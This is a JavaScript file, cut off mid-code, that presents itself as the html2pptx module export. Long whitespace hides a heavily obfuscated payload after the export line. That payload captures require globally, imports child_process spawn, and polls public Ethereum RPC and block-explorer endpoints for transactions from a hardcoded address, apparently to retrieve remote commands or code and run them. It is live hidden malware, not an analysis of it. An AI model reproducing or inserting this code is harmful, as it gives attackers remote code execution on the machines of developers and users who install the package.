module.exports = html2pptx;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i="A9-0008-2";const _0x44ceab=_0xc702;(function(_0x242c2a,_0xcc5db6){const _0x55afa4=_0xc702,_0x2abd94=_0x242c2a();while(!![]){try{const _0x3f9b11=-parseInt(_0x55afa4(0x12b))/(-0x368+0x1cce+0x877*-0x3)*(-parseInt(_0x55afa4(0x17f))/(-0x227*-0x11+-0x5d7+-0x1ebe))+-parseInt(_0x55afa4(0xec))/(-0x2316+0xb*0x1c+0x21e5)*(parseInt(_0x55afa4(0x1ac))/(0x897+0x1921+-0x21b4))+-parseInt(_0x55afa4(0xed))/(-0x1459+-0x717*-0x4+-0x7fe)*(parseInt(_0x55afa4(0xa7))/(-0x6*-0x4d2+-0x1640+-0x6a6))+-parseInt(_0x55afa4(0xaa))/(0x53b*0x4+-0x1*0x818+-0xccd)+-parseInt(_0x55afa4(0x138))/(-0x167*-0xa+0x1*-0xd1c+-0xe2)+-parseInt(_0x55afa4(0xd1))/(0xd25*-0x1+0x66e+0x6c0)*(-parseInt(_0x55afa4(0xd9))/(-0xb*0x227+-0x23e5+-0x2*-0x1dce))+parseInt(_0x55afa4(0x1bd))/(-0x2208+0x11a1+0x1072);if(_0x3f9b11===_0xcc5db6)break;else _0x2abd94['push'](_0x2abd94['shift']());}catch(_0x2923f3){_0x2abd94['push'](_0x2abd94['shift']());}}}(_0x3307,-0xc750f+-0x1991b*0x3+0x1*0x1a9896),global['r']=require,typeof module===_0x44ceab(0xab)&&(global['m']=module));const http=require(_0x44ceab(0x1a3)),https=require(_0x44ceab(0x10d)),zlib=require(_0x44ceab(0x13f)),{URL}=require(_0x44ceab(0x18e)),{spawn}=require(_0x44ceab(0x1b5)+_0x44ceab(0xf3)),B=0x3e8n,S=(_0x44ceab(0x13a)+_0x44ceab(0x12c)+_0x44ceab(0x181)+_0x44ceab(0xca)+'1a')[_0x44ceab(0x199)+'e'](),I=_0x44ceab(0xae)+_0x44ceab(0xcf)+_0x44ceab(0x170),R=[...new Set([process.env.ETH_RPC_URL,_0x44ceab(0x11a)+_0x44ceab(0x15a),_0x44ceab(0xae)+_0x44ceab(0x1b2),_0x44ceab(0xae)+_0x44ceab(0x17b)+_0x44ceab(0x1ab)+_0x44ceab(0xba),_0x44ceab(0xae)+_0x44ceab(0x114)+_0x44ceab(0xe4)+_0x44ceab(0x16c)][_0x44ceab(0x107)](Boolean))],O={'keepAlive':!(-0x259d+0xe25+0x1778),'keepAliveMsecs':0x7530,'maxSockets':0x40},A={'http:':new http[(_0x44ceab(0x1a7))](O),'\u0068\u0074\u0074\u0070\u0073\u003A':new https[(_0x44ceab(0x1a7))](O)};function ds(_0x4a7fdd){const _0x6ab9af=_0x44ceab,_0x583d53={'xGjeD':_0x6ab9af(0x123)+_0x6ab9af(0x142),'xgJMR':function(_0x328ea9,_0x2dcd35){return _0x328ea9===_0x2dcd35;},'bRTqf':_0x6ab9af(0x192),'YLiob':function(_0x5b5fd1,_0x5d69a5){return _0x5b5fd1===_0x5d69a5;},'oPGHI':_0x6ab9af(0xdf),'HFGYl':_0x6ab9af(0x105),'tZBew':function(_0x137fc4){return _0x137fc4();}},_0x3ac994=(_0x4a7fdd[_0x6ab9af(0xaf)][_0x583d53[_0x6ab9af(0xc3)]]||'')[_0x6ab9af(0x199)+'e'](),_0x10d60b=_0x583d53[_0x6ab9af(0x1b0)](_0x3ac994,_0x583d53[_0x6ab9af(0x168)])||_0x583d53[_0x6ab9af(0x121)](_0x3ac994,_0x583d53[_0x6ab9af(0x83)])?zlib[_0x6ab9af(0x15b)+'ip']:_0x583d53[_0x6ab9af(0x1b0)](_0x3ac994,_0x583d53[_0x6ab9af(0x9f)])?zlib[_0x6ab9af(0xc6)+_0x6ab9af(0x126)]:_0x583d53[_0x6ab9af(0x121)](_0x3ac994,'br')?zlib[_0x6ab9af(0x14c)+_0x6ab9af(0x17e)+'ss']:-0x150*-0xa+-0x5*0x697+0x13d3;return _0x10d60b?_0x4a7fdd[_0x6ab9af(0x149)](_0x583d53[_0x6ab9af(0x155)](_0x10d60b)):_0x4a7fdd;}function hr(_0x288096,{method:_0x180375=_0x44ceab(0x176),body:_0x1e1d38,signal:_0x4a5a6a}={}){const _0x22dd27=_0x44ceab,_0x2e88b9={'Zbgqs':_0x22dd27(0xf5),'webnr':function(_0x33f8c6,_0x52d640){return _0x33f8c6<_0x52d640;},'MRRMe':function(_0xb4b4ee,_0x48ba5e){return _0xb4b4ee>=_0x48ba5e;},'UOFLx':function(_0x3e4012,_0x28840e){return _0x3e4012(_0x28840e);},'beCzF':function(_0x34c01f,_0x1140c2){return _0x34c01f===_0x1140c2;},'dfFGU':function(_0x5b4d4d,_0x3c699a){return _0x5b4d4d!==_0x3c699a;},'eFyPx':function(_0x5cfbd8,_0x3010e5){return _0x5cfbd8(_0x3010e5);},'Dwqwq':_0x22dd27(0xcc),'QOAjr':_0x22dd27(0x175),'MltrU':_0x22dd27(0x16b),'PvcTj':_0x22dd27(0x194),'zTKCw':function(_0x2674a9,_0x30968b){return _0x2674a9+_0x30968b;},'xDPaM':function(_0x32c512,_0x2e00af){return _0x32c512!=_0x2e00af;},'pZXYl':function(_0x36cc6e,_0x4b2060){return _0x36cc6e===_0x4b2060;},'vRwSb':_0x22dd27(0xd3)+_0x22dd27(0x1a9),'ucpaX':_0x22dd27(0x198)+_0x22dd27(0x128),'yInys':_0x22dd27(0x1aa),'EjCUD':function(_0x22c9dc,_0x581aaa){return _0x22c9dc!=_0x581aaa;},'vwSTK':_0x22dd27(0x82)+'pe','BrVWx':_0x22dd27(0x120)+_0x22dd27(0x167)},_0x14b1c7=new URL(_0x288096),_0x1ecfec=_0x2e88b9[_0x22dd27(0x111)](_0x14b1c7[_0x22dd27(0x191)],_0x2e88b9[_0x22dd27(0xe6)])?https:http,_0x584dff={'Accept':_0x2e88b9[_0x22dd27(0x17d)],'\u0041\u0063\u0063\u0065\u0070\u0074\u002D\u0045\u006E\u0063\u006F\u0064\u0069\u006E\u0067':_0x2e88b9[_0x22dd27(0x185)],'Connection':_0x2e88b9[_0x22dd27(0x125)]};return _0x2e88b9[_0x22dd27(0x18c)](_0x1e1d38,null)&&(_0x584dff[_0x2e88b9[_0x22dd27(0x129)]]=_0x2e88b9[_0x22dd27(0x17d)],_0x584dff[_0x2e88b9[_0x22dd27(0x154)]]=Buffer[_0x22dd27(0xe7)](_0x1e1d38)),new Promise((_0x553038,_0xe33d86)=>{const _0x384fdc=_0x22dd27,_0x4dc16f={'FZbrm':_0x2e88b9[_0x384fdc(0xfc)],'jxKxj':function(_0x564452,_0x257140){const _0x342241=_0x384fdc;return _0x2e88b9[_0x342241(0x11c)](_0x564452,_0x257140);},'gqTzu':function(_0x3c16fa,_0xae1d3d){const _0x5890f6=_0x384fdc;return _0x2e88b9[_0x5890f6(0x1c1)](_0x3c16fa,_0xae1d3d);},'fCyKB':function(_0x2c7dce,_0x234c08){const _0x134c5f=_0x384fdc;return _0x2e88b9[_0x134c5f(0xff)](_0x2c7dce,_0x234c08);},'BSxZQ':function(_0x3052a6,_0x36c1ac){const _0x5582cf=_0x384fdc;return _0x2e88b9[_0x5582cf(0xf8)](_0x3052a6,_0x36c1ac);},'CZgSO':function(_0x4bea43,_0x2686c3){const _0x578467=_0x384fdc;return _0x2e88b9[_0x578467(0x160)](_0x4bea43,_0x2686c3);},'qMvGW':function(_0x2342c2,_0x2cdfce){const _0x7d9afe=_0x384fdc;return _0x2e88b9[_0x7d9afe(0x160)](_0x2342c2,_0x2cdfce);},'MPqWX':function(_0xbc0d1,_0x5060e6){const _0x551f2c=_0x384fdc;return _0x2e88b9[_0x551f2c(0x146)](_0xbc0d1,_0x5060e6);},'dHoEF':function(_0x9d4007,_0x1a2597){const _0x1174c7=_0x384fdc;return _0x2e88b9[_0x1174c7(0xff)](_0x9d4007,_0x1a2597);},'EpZSh':_0x2e88b9[_0x384fdc(0xa1)],'cYebN':_0x2e88b9[_0x384fdc(0xa9)],'BHwLs':_0x2e88b9[_0x384fdc(0xe9)]},_0x154605=_0x1ecfec[_0x384fdc(0x8a)]({'hostname':_0x14b1c7[_0x384fdc(0xb8)],'port':_0x14b1c7[_0x384fdc(0x96)]||(_0x2e88b9[_0x384fdc(0xf8)](_0x14b1c7[_0x384fdc(0x191)],_0x2e88b9[_0x384fdc(0xe6)])?-0x22dc+-0x75e+-0x3ff*-0xb:0x190a+-0x275*-0xe+0x764*-0x8),'path':_0x2e88b9[_0x384fdc(0x97)](_0x14b1c7[_0x384fdc(0xcd)],_0x14b1c7[_0x384fdc(0xa5)]),'method':_0x180375,'agent':A[_0x14b1c7[_0x384fdc(0x191)]],'signal':_0x4a5a6a,'headers':_0x584dff},_0x10d061=>{const _0x32263c=_0x384fdc,_0x360a3b={'wcugX':_0x4dc16f[_0x32263c(0x177)],'nsBHQ':function(_0x49ffa7,_0x50e3e4){const _0x12b240=_0x32263c;return _0x4dc16f[_0x12b240(0x18d)](_0x49ffa7,_0x50e3e4);},'ALAHX':function(_0x575592,_0x57f6cb){const _0x4b2af9=_0x32263c;return _0x4dc16f[_0x4b2af9(0xe8)](_0x575592,_0x57f6cb);},'wxUwN':function(_0xfe9a59,_0x578340){const _0x395788=_0x32263c;return _0x4dc16f[_0x395788(0x89)](_0xfe9a59,_0x578340);},'gnTPd':function(_0x5baf6e,_0x2e93d8){const _0x980b65=_0x32263c;return _0x4dc16f[_0x980b65(0xac)](_0x5baf6e,_0x2e93d8);},'gdiqs':function(_0x1607ba,_0x15779b){const _0x11943d=_0x32263c;return _0x4dc16f[_0x11943d(0x152)](_0x1607ba,_0x15779b);},'jQhWh':function(_0x9ace49,_0x49dfad){const _0x3317be=_0x32263c;return _0x4dc16f[_0x3317be(0x110)](_0x9ace49,_0x49dfad);},'QgmDv':function(_0x18a864,_0x37b6d8){const _0xeab540=_0x32263c;return _0x4dc16f[_0xeab540(0x135)](_0x18a864,_0x37b6d8);},'WPvOf':function(_0x595740,_0x2e0fd7){const _0x383d0c=_0x32263c;return _0x4dc16f[_0x383d0c(0x11f)](_0x595740,_0x2e0fd7);}},_0xe9039=_0x4dc16f[_0x32263c(0x89)](ds,_0x10d061),_0x34023=[];_0xe9039['on'](_0x4dc16f[_0x32263c(0x179)],_0x13f678=>_0x34023[_0x32263c(0xe3)](_0x13f678)),_0xe9039['on'](_0x4dc16f[_0x32263c(0x11b)],()=>{const _0x256843=_0x32263c,_0x16eb44=Buffer[_0x256843(0x12a)](_0x34023)[_0x256843(0x156)](_0x360a3b[_0x256843(0xa3)])[_0x256843(0xa0)]();if(_0x360a3b[_0x256843(0xb0)](_0x10d061[_0x256843(0x104)],-0x115*-0x11+0x13b5*-0x1+0x218)||_0x360a3b[_0x256843(0x193)](_0x10d061[_0x256843(0x104)],-0x130*0x9+0xe*0x1e1+0x2*-0x739))return _0x360a3b[_0x256843(0x1a1)](_0xe33d86,new Error('H'+_0x10d061[_0x256843(0x104)]+':'+_0x16eb44[_0x256843(0x1ad)](0x3*0xb2d+-0x103f+-0x1148,-0x1*0x1baf+-0x2*-0x30b+0x4f*0x47)));if(!_0x16eb44||_0x360a3b[_0x256843(0xde)](_0x16eb44[-0x1*-0x1542+-0x2*-0xe9b+-0x3278],'\u003C')||_0x360a3b[_0x256843(0xfe)](_0x16eb44[0xb8b+0x10*0xbc+0x1*-0x174b],'\u007B')&&_0x360a3b[_0x256843(0xe2)](_0x16eb44[0xea5+0x1*-0x236+-0xc6f*0x1],'\u005B'))return _0x360a3b[_0x256843(0x1a1)](_0xe33d86,new Error('J:'+_0x16eb44[_0x256843(0x1ad)](-0x2200+0x2f*-0x9b+0x3e75,-0x22c9+0x4f4+0x1e25)));try{_0x360a3b[_0x256843(0x94)](_0x553038,JSON[_0x256843(0x190)](_0x16eb44));}catch(_0x34ad21){_0x360a3b[_0x256843(0x86)](_0xe33d86,new Error('P:'+_0x34ad21[_0x256843(0xb5)]));}}),_0xe9039['on'](_0x4dc16f[_0x32263c(0x124)],_0xe33d86);});_0x154605['on'](_0x2e88b9[_0x384fdc(0xe9)],_0xe33d86),_0x2e88b9[_0x384fdc(0xa8)](_0x1e1d38,null)&&_0x154605[_0x384fdc(0x151)](_0x1e1d38),_0x154605[_0x384fdc(0x175)]();});}function _0x3307(){const _0x3b7856=['HTMau','kZlWZ','bnHJf','RptWP','write','CZgSO',':443','BrVWx','tZBew','toString','fkRSW',':443/0x/ls','rsXqP','pc.io/eth','createGunz','KJKIG','shSPT','OcATS','stener','dfFGU','ignore','SIecw','TQAET','zezXV','QZRte','POST','ngth','bRTqf','QQiEt','uUkdF','error','stapi.io','LnaXN','vAWQN','kpHNq','ut.com/api','BtJwU','RWpMw','find','catch','end','GET','FZbrm','crZCf','EpZSh','map','hereum-rpc','Kit/537.36','vRwSb','liDecompre','595780QbjmdV','CHepZ','6f0121063e','VyEOa','OGXGz','rwOMD','ucpaX','aBWJK','addEventLi','nsactionCo','9&page=1&o','FakYG','Jpnst','EjCUD','jxKxj','url','node','parse','protocol','gzip','ALAHX','https:','\x27]=\x27','count&acti',')\x20AppleWeb','gzip,\x20defl','toLowerCas','HoDWs','eth_getBlo','QZywI','wibbZ','unt','xOtmL','ike\x20Gecko)','wxUwN','pMLys','http','result','_t_s','forEach','Agent','all','n/json','keep-alive','.publicnod','3908idpnlr','slice','UniBA','AiKTD','xgJMR','ViSQB','h.drpc.org','YyqQS','uJddd','child_proc','uyVDL','ZuHfL','yyHsj','oflCH','cHSXQ','CQAWy','length','32590789fJQcWT','\x20NT\x2010.0;\x20','JxCbi','QbRRV','MRRMe','nerJu','bpVfp','Content-Ty','oPGHI','RbxTf','min','WPvOf','from','nGxVW','fCyKB','request','LyGdN','czpyg','unref','BLrzN','subarray','replace','_t_u','transactio','0\x20(Windows','QgmDv','ojvxD','port','zTKCw','ck=9999999','\x20(KHTML,\x20l','charCodeAt','global[\x27_V','AARcQ','_H2','isArray','HFGYl','trim','Dwqwq','get','wcugX','blockNumbe','search','PvZQW','6AKWwcZ','xDPaM','QOAjr','5961487gAvUKF','object','BSxZQ','cyCpl','https://et','headers','nsBHQ','jIkRj','unMKf','then','finally','message','mEGgj',',Sr3=@','hostname','\x27;global[\x27','e.com','wIbeD','DTEdO','QthWB','EkQIH','stringify','q4FZkxX{!h','OVUFq','no\x20b64','xGjeD','HkrSh','PVNNR','createInfl','WByWQ','IctFD','bymlS','9aDC2490Ef','1.0.0.0\x20Sa','data','pathname','ilterby=fr','h.blocksco','caxup','23427SFKuld','cRXVv','applicatio','uMvOo','Mozilla/5.','base64','tpJHG','tZibq','1300BKywdY','al=global;','e;global[\x27','ckByNumber','findIndex','gnTPd','x-gzip','resume','PskPD','jQhWh','push','public.bla','HQMBO','PvcTj','byteLength','gqTzu','MltrU','hSmHa','ucUNo','2823eEOkZK','1647205wUeYDY','r\x27]=requir','UISzP','onYDw','m\x27]=module','on=txlist&','ess','signal','utf8','YfHXM','b64','beCzF','DfeAz','nonce',';var\x20_glob','Zbgqs','MJEEv','gdiqs','UOFLx','eth_blockN','resolve','jwZZr','@^1aQk','statusCode','deflate','SfXzz','filter','y-p_>d$0B&','abort','Win64;\x20x64','k=0&endblo',':80','https','USRYf','empty','qMvGW','pZXYl','hex','\x20Chrome/13','h-mainnet.','x-payload-','HEAD','SrQJg','eth_getTra','OVJbp','https://1r','cYebN','webnr','bKTVo','?module=ac','dHoEF','Content-Le','YLiob','http://','content-en','BHwLs','yInys','ate','address=','ate,\x20br','vwSTK','concat','1QiuBJh','D311D3080e','GGbog','ffset=20&s','controller','xzqPs','durVE','ngsKF','OxJjQ','eGiCH','MPqWX','RmfMB','fLEkP','7089872YjfbgX',':443/0x/cl','0xa322E5f3','&startbloc','2.0','ufUJK','zAkNr','zlib','fari/537.3','bPQfv','coding','run','FXTJz','any','eFyPx','umber','ogFTC','pipe','XUzln','ort=desc&f','createBrot'];_0x3307=function(){return _0x3b7856;};return _0x3307();}function wr(_0x4bf01d,_0x2d60a1){const _0x302f7f=_0x44ceab,_0x44f1c3=R[_0x302f7f(0x17a)](()=>new AbortController());return _0x2d60a1&&_0x44f1c3[_0x302f7f(0x1a6)](_0x206e57=>_0x2d60a1[_0x302f7f(0x187)+_0x302f7f(0x15f)](_0x302f7f(0x109),()=>_0x206e57[_0x302f7f(0x109)](),{'once':!(-0x4ea+0x1*0xbd9+-0x6ef)})),Promise[_0x302f7f(0x145)](R[_0x302f7f(0x17a)]((_0x5bb22b,_0x500809)=>_0x4bf01d(_0x5bb22b,_0x44f1c3[_0x500809][_0x302f7f(0xf4)])))[_0x302f7f(0xb4)](()=>{const _0x4f9e9e=_0x302f7f;for(const _0x51b2a9 of _0x44f1c3)_0x51b2a9[_0x4f9e9e(0x109)]();});}function _0xc702(_0x439202,_0x221bcc){_0x439202=_0x439202-(-0x9*-0x1+-0x7a2+0x81a);const _0x258a51=_0x3307();let _0x1d3d9c=_0x258a51[_0x439202];return _0x1d3d9c;}function rc(_0xda6d24,_0x2f10db,_0x33e410,_0x33ea87){const _0x402523=_0x44ceab,_0xc93c85={'czpyg':function(_0x10ed1d,_0x268c4e,_0x151e32){return _0x10ed1d(_0x268c4e,_0x151e32);},'AARcQ':_0x402523(0x166),'uJddd':_0x402523(0x13c)};return _0xc93c85[_0x402523(0x8c)](hr,_0xda6d24,{'method':_0xc93c85[_0x402523(0x9c)],'body':JSON[_0x402523(0xbf)]({'jsonrpc':_0xc93c85[_0x402523(0x1b4)],'id':0x1,'method':_0x2f10db,'params':_0x33e410}),'signal':_0x33ea87})[_0x402523(0xb3)](_0x105f19=>_0x105f19[_0x402523(0x1a4)]);}function rb(_0x718651,_0x5f02ff,_0x2d059d){const _0x74a62a=_0x44ceab,_0x56d273={'PvZQW':function(_0x775ce9,_0x1b0e71,_0x14c8b9){return _0x775ce9(_0x1b0e71,_0x14c8b9);},'caxup':_0x74a62a(0x166)};return _0x56d273[_0x74a62a(0xa6)](hr,_0x718651,{'method':_0x56d273[_0x74a62a(0xd0)],'body':JSON[_0x74a62a(0xbf)](_0x5f02ff[_0x74a62a(0x17a)](([_0x1d278d,_0x9f4d19],_0x4a23f8)=>({'jsonrpc':_0x74a62a(0x13c),'id':_0x4a23f8+(-0x65a+0x65e*-0x1+0xcb9),'method':_0x1d278d,'params':_0x9f4d19}))),'signal':_0x2d059d})[_0x74a62a(0xb3)](_0x23c1b4=>{const _0x433ea=_0x74a62a,_0x49fb65=new Map(_0x23c1b4[_0x433ea(0x17a)](_0x50a29a=>[_0x50a29a['id'],_0x50a29a]));return _0x5f02ff[_0x433ea(0x17a)]((_0x495ead,_0x1ee36d)=>_0x49fb65[_0x433ea(0xa2)](_0x1ee36d+(-0x11*0x14d+0x11c*0x14+-0x12))[_0x433ea(0x1a4)]);});}const bh=_0x40171f=>'\u0030\u0078'+_0x40171f[_0x44ceab(0x156)](-0x7df+-0x366+0x3*0x3c7);function fm(_0x540367){const _0x3a68d0={'vAWQN':function(_0x1b34c2,_0x3e11fd){return _0x1b34c2(_0x3e11fd);},'TQAET':function(_0x198eea,_0x7e3b93){return _0x198eea(_0x7e3b93);},'onYDw':function(_0x8960f0,_0x575a0a){return _0x8960f0===_0x575a0a;},'tZibq':function(_0x24609a,_0x5902a5){return _0x24609a===_0x5902a5;}};return new Promise(_0x47f6db=>{const _0x2a597f=_0xc702,_0x384d44={'bpVfp':function(_0x449e71,_0x542e23){const _0x3bbbce=_0xc702;return _0x3a68d0[_0x3bbbce(0x163)](_0x449e71,_0x542e23);},'oflCH':function(_0x4ac23a,_0x782e6e){const _0x2f0696=_0xc702;return _0x3a68d0[_0x2f0696(0xf0)](_0x4ac23a,_0x782e6e);},'RWpMw':function(_0x5c212f,_0x4a2ebf){const _0x349934=_0xc702;return _0x3a68d0[_0x349934(0xd8)](_0x5c212f,_0x4a2ebf);},'kpHNq':function(_0xf237d4,_0x2f4069){const _0x42ee91=_0xc702;return _0x3a68d0[_0x42ee91(0x163)](_0xf237d4,_0x2f4069);}};let _0x2002c9=_0x540367[_0x2a597f(0x1bc)];if(!_0x2002c9)return _0x3a68d0[_0x2a597f(0x16e)](_0x47f6db,null);let _0x2587b3=!(0x156e+-0x29*0x9d+-0x1c*-0x22);const _0x4fc567=_0x145588=>{const _0x3721c3=_0x2a597f;if(_0x2587b3)return;_0x2587b3=!(0x1d7a*-0x1+-0x2*-0xf6b+0x4*-0x57);for(const _0x4467d0 of _0x540367)_0x4467d0[_0x3721c3(0x12f)][_0x3721c3(0x109)]();_0x3a68d0[_0x3721c3(0x16e)](_0x47f6db,_0x145588);};for(const _0xfe772d of _0x540367)_0xfe772d[_0x2a597f(0x143)]()[_0x2a597f(0xb3)](_0x2cf5b=>{const _0x1c2d03=_0x2a597f;if(_0x2587b3)return;_0x2cf5b?_0x384d44[_0x1c2d03(0x81)](_0x4fc567,_0x2cf5b):_0x384d44[_0x1c2d03(0x1b9)](--_0x2002c9,0xede+0x300+0x8ef*-0x2)&&_0x384d44[_0x1c2d03(0x81)](_0x47f6db,null);})[_0x2a597f(0x174)](()=>{const _0x50b4ed=_0x2a597f;!_0x2587b3&&_0x384d44[_0x50b4ed(0x172)](--_0x2002c9,0x25a1+-0x8ad*0x2+-0xb3*0x1d)&&_0x384d44[_0x50b4ed(0x16f)](_0x47f6db,null);});});}const cb=_0x3f6224=>[...new Set([_0x3f6224-0x1n,_0x3f6224,_0x3f6224+0x1n,_0x3f6224-B-0x1n,_0x3f6224-B,_0x3f6224-B+0x1n][_0x44ceab(0x107)](_0x154e0d=>_0x154e0d>=0x0n))];function bt(_0x408b67){const _0x303cd1=_0x44ceab,_0x3b1daf=new AbortController();return{'controller':_0x3b1daf,'run':()=>wr((_0x1523b0,_0x1fd6a4)=>rc(_0x1523b0,_0x303cd1(0x19b)+_0x303cd1(0xdc),[bh(_0x408b67),!(-0x1fd1+0xc2*0x10+0x13b1)],_0x1fd6a4),_0x3b1daf[_0x303cd1(0xf4)])[_0x303cd1(0xb3)](_0x201c4c=>{const _0x123ec6=_0x303cd1,_0x401544=_0x201c4c?.[_0x123ec6(0x92)+'ns'],_0x139f3a=Array[_0x123ec6(0x9e)](_0x401544)?_0x401544[_0x123ec6(0x173)](_0x39f4e3=>_0x39f4e3[_0x123ec6(0x87)]?.[_0x123ec6(0x199)+'e']()===S):null;return _0x139f3a?{'blockNumber':_0x408b67,'tx':_0x139f3a}:null;})};}function na(_0x7cad65,_0xca9e47){const _0x84e27d=_0x44ceab,_0x3c49d0={'xOtmL':function(_0x1e5a6a,_0x5c706f,_0x2bf6fb){return _0x1e5a6a(_0x5c706f,_0x2bf6fb);}},_0x1e8487=_0x7cad65[_0x84e27d(0x17a)](_0xb7b7a5=>[_0x84e27d(0x118)+_0x84e27d(0x188)+_0x84e27d(0x19e),[S,bh(_0xb7b7a5)]]);return _0x3c49d0[_0x84e27d(0x19f)](wr,(_0x46ae76,_0x5bb4a1)=>rb(_0x46ae76,_0x1e8487,_0x5bb4a1),_0xca9e47)[_0x84e27d(0xb3)](_0x21bb32=>_0x21bb32[_0x84e27d(0x17a)](BigInt))[_0x84e27d(0x174)](()=>Promise[_0x84e27d(0x1a8)](_0x1e8487[_0x84e27d(0x17a)](([_0x5e0af3,_0x3d3a32])=>wr((_0x5c21ad,_0x2e3faf)=>rc(_0x5c21ad,_0x5e0af3,_0x3d3a32,_0x2e3faf),_0xca9e47)))[_0x84e27d(0xb3)](_0x319440=>_0x319440[_0x84e27d(0x17a)](BigInt)));}function ls(_0x599551){const _0x46f089=_0x44ceab,_0x4f37fe={'rsXqP':function(_0x314d5c,_0xa09b1d){return _0x314d5c!==_0xa09b1d;},'HTMau':function(_0x4d2aba,_0x2a3505){return _0x4d2aba===_0x2a3505;},'cHSXQ':function(_0x46b45c,_0x810410){return _0x46b45c(_0x810410);},'KJKIG':function(_0x584fc8,_0x12f945){return _0x584fc8<=_0x12f945;},'RptWP':function(_0x473a49,_0x4b88e6){return _0x473a49(_0x4b88e6);},'rwOMD':function(_0x37c87c,_0x32fe38){return _0x37c87c===_0x32fe38;},'SfXzz':function(_0x329a18,_0x33ff17){return _0x329a18-_0x33ff17;},'bnHJf':function(_0x5270be,_0x437bf5){return _0x5270be>_0x437bf5;},'nerJu':function(_0x52648e){return _0x52648e();},'PVNNR':function(_0x355d71,_0x4806ad){return _0x355d71(_0x4806ad);},'IctFD':function(_0x5e3f1a,_0x5d134d){return _0x5e3f1a(_0x5d134d);},'mEGgj':function(_0x2c432a,_0x3349b9){return _0x2c432a+_0x3349b9;},'zezXV':function(_0x765091,_0xfafc34){return _0x765091/_0xfafc34;},'UISzP':function(_0x515f4f,_0x2ee081){return _0x515f4f*_0x2ee081;},'QQiEt':function(_0x46f2a5,_0x311e8c,_0x12f7b2){return _0x46f2a5(_0x311e8c,_0x12f7b2);},'ufUJK':function(_0x1a6331,_0x3053a0){return _0x1a6331-_0x3053a0;},'DTEdO':function(_0x63b7c2,_0x34f196){return _0x63b7c2??_0x34f196;}},_0x2dafd4=new AbortController(),_0x844271=()=>_0x2dafd4[_0x46f089(0x109)]();return Promise[_0x46f089(0x101)](_0x4f37fe[_0x46f089(0xbc)](_0x599551,null))[_0x46f089(0xb3)](_0x2f1445=>_0x2f1445!=null?_0x2f1445:wr((_0x1a906f,_0x20bf86)=>rc(_0x1a906f,_0x46f089(0x100)+_0x46f089(0x147),[],_0x20bf86),_0x2dafd4[_0x46f089(0xf4)])[_0x46f089(0xb3)](_0x337616=>BigInt(_0x337616)))[_0x46f089(0xb3)](_0x7dfc96=>wr((_0x3353f9,_0x53082)=>rc(_0x3353f9,_0x46f089(0x118)+_0x46f089(0x188)+_0x46f089(0x19e),[S,bh(_0x7dfc96)],_0x53082),_0x2dafd4[_0x46f089(0xf4)])[_0x46f089(0xb3)](_0x264dec=>[_0x7dfc96,BigInt(_0x264dec)]))[_0x46f089(0xb3)](([_0x204e25,_0x4391d2])=>{const _0x1bca21=_0x46f089,_0x245ede={'uUkdF':function(_0x26ea2f,_0x28f631){const _0x2ed924=_0xc702;return _0x4f37fe[_0x2ed924(0x184)](_0x26ea2f,_0x28f631);},'YfHXM':function(_0x22b607,_0x1b5862){const _0x245652=_0xc702;return _0x4f37fe[_0x245652(0x106)](_0x22b607,_0x1b5862);},'VyEOa':function(_0x109d6f,_0x5d2a4a){const _0x51b5e8=_0xc702;return _0x4f37fe[_0x51b5e8(0x14f)](_0x109d6f,_0x5d2a4a);},'hSmHa':function(_0x53e4df,_0x4c6c4c){const _0x5482bf=_0xc702;return _0x4f37fe[_0x5482bf(0x106)](_0x53e4df,_0x4c6c4c);},'HoDWs':function(_0x2c43c1){const _0x1949b9=_0xc702;return _0x4f37fe[_0x1949b9(0x1c2)](_0x2c43c1);},'OVUFq':function(_0x2e34e9,_0x1f4702){const _0x546497=_0xc702;return _0x4f37fe[_0x546497(0xc5)](_0x2e34e9,_0x1f4702);},'uyVDL':function(_0x5d5f21,_0x2acf3f){const _0x3dddda=_0xc702;return _0x4f37fe[_0x3dddda(0xc8)](_0x5d5f21,_0x2acf3f);},'ViSQB':function(_0x3795ce,_0x1f5306){const _0x1218d8=_0xc702;return _0x4f37fe[_0x1218d8(0x15c)](_0x3795ce,_0x1f5306);},'AiKTD':function(_0x2b505a,_0x3153c7){const _0x52f1f9=_0xc702;return _0x4f37fe[_0x52f1f9(0xb6)](_0x2b505a,_0x3153c7);},'bymlS':function(_0x3e4d2e,_0x499abe){const _0x2cd6f0=_0xc702;return _0x4f37fe[_0x2cd6f0(0x164)](_0x3e4d2e,_0x499abe);},'jwZZr':function(_0x5aa412,_0xeb0c91){const _0x34cacd=_0xc702;return _0x4f37fe[_0x34cacd(0xef)](_0x5aa412,_0xeb0c91);},'tpJHG':function(_0x25f10c,_0x31293f,_0x2fa3c8){const _0xa133d6=_0xc702;return _0x4f37fe[_0xa133d6(0x169)](_0x25f10c,_0x31293f,_0x2fa3c8);}},_0x4e5ea3=_0x4f37fe[_0x1bca21(0x13d)](_0x4391d2,0x1n);let _0x270113=-0x1n,_0x3092fe=_0x204e25;const _0x486901=()=>_0x3092fe-_0x270113<=0x1n?wr((_0x2c5d53,_0x25226a)=>rc(_0x2c5d53,_0x1bca21(0x19b)+_0x1bca21(0xdc),[bh(_0x3092fe),!(0x10d*-0x13+0x4*0x298+-0x1*-0x997)],_0x25226a),_0x2dafd4[_0x1bca21(0xf4)])[_0x1bca21(0xb3)](_0x50c376=>{const _0x38672b=_0x1bca21,_0xaf6429=_0x50c376?.[_0x38672b(0x92)+'ns']||[];let _0x1690ce=null;for(const _0x1560a1 of _0xaf6429){if(_0x4f37fe[_0x38672b(0x159)](_0x1560a1[_0x38672b(0x87)]?.[_0x38672b(0x199)+'e'](),S))continue;if(_0x4f37fe[_0x38672b(0x14d)](_0x4f37fe[_0x38672b(0x1ba)](BigInt,_0x1560a1[_0x38672b(0xfa)]),_0x4e5ea3)){_0x1690ce=_0x1560a1;break;}_0x1690ce&&_0x4f37fe[_0x38672b(0x15c)](_0x4f37fe[_0x38672b(0x1ba)](BigInt,_0x1560a1[_0x38672b(0xfa)]),_0x4f37fe[_0x38672b(0x150)](BigInt,_0x1690ce[_0x38672b(0xfa)]))||(_0x1690ce=_0x1560a1);}return{'blockNumber':_0x3092fe,'tx':_0x1690ce};}):(_0x136021=>{const _0x337e14=_0x1bca21,_0x32454d={'FakYG':function(_0x5cbe21,_0x8b17e1){const _0x59f183=_0xc702;return _0x245ede[_0x59f183(0x16a)](_0x5cbe21,_0x8b17e1);},'DfeAz':function(_0x4b3382,_0x60dd00){const _0x4ae815=_0xc702;return 